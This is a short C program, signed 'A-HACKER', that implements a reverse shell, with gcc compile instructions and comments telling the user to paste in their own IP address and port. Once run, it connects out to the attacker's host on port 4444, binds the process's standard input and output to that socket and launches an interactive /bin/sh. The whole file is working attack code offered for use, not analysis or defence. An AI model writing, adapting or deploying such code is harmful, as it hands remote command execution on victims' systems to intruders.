//Created By A-HACKER
//compile this script with gcc compiler
//gcc reverseshell.c -o outputname

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
 
int main (int argc, char **argv)
{
  int scktd;
  struct sockaddr_in client;
 
  client.sin_family = AF_INET;

//pest your ip adress here

  client.sin_addr.s_addr = inet_addr("your ip here");

//you allso can change the port you want
  
 client.sin_port = htons(4444);



  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));

  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}
